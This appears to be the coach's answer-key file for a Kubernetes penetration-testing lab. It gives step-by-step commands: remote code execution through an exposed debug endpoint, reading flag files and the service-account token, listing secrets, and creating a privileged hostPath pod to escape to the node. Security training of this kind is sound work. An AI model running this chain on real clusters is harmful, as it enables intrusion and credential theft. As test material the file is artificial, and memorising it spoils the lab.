# Coach context — Soft-Schedule

Ground truth for the coach. Never quote verbatim; escalate per stage.

## Intended path

1. Recon: `curl http://app01/` → shop-app index leaks `/exec`. Probe
   `curl 'http://app01/exec?cmd=id'` → `uid=0(root)` inside the pod.
2. **pod-shell**: `curl 'http://app01/exec?cmd=touch+/tmp/.pwned'` →
   `check_flag pod-shell` (grader crictl-execs into the pod).
3. **api-secret**: `/etc/labflags/` is mounted into the pod —
   `?cmd=ls+/etc/labflags` → `?cmd=cat+/etc/labflags/api-secret.txt` →
   submit value.
4. **node-flag** (the escape):
   - `?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token`
   - In-pod curl to the API: `curl -ks -H "Authorization: Bearer $T"
     https://kubernetes.default.svc/api/v1/namespaces/prod/secrets`
     (prod/app-config: db-password decoy + a hint pointing at /root/k8s-flag.txt)
   - shop-sa may create pods in prod: POST a pod spec (JSON body to
     /api/v1/namespaces/prod/pods) — image pentrain/shop-app:latest,
     `securityContext.privileged: true`, `hostPath: /host` volume, command
     `cat /host/root/k8s-flag.txt; sleep 30`.
   - Read it back: GET `/api/v1/namespaces/prod/pods/<name>/log` → flag in
     the pod's stdout → submit.

## Key facts (stage 2–3 only)

- All API calls run THROUGH `/exec?cmd=` on the pod — url-encode inner
  commands (`%20`, `+`), and quote nested JSON carefully.
- SA can: `get/list secrets` in prod, `create pods`, `get pods/log` in prod.
- `/host` inside a privileged pod IS app01's root fs (kind extraMount).
- The RBAC RoleBinding `shop-sa-prod` in namespace prod is the vuln —
  discovering it via `can-i --list` is legitimate enumeration.

## Common wrong turns

- Looking for kubectl/ssh creds — everything needed is HTTP: the pod's
  debug endpoint for RCE, the API for escalation.
- Querying the API with `--cacert` gymnastics — `-k` works, the point is
  the token not the CA.
- Expecting `pods/exec` — RBAC grants `pods/log` instead: put the flag read
  in the pod's `command`, read stdout from the log endpoint.
- Assuming secrets on this box hold flags — prod/app-config is a decoy
  pointing at the node path.
- Mounting `/` instead of `/host` in the evil pod — the kind node exposes
  the VM root only at `/host` (extraMount), not at `/`.
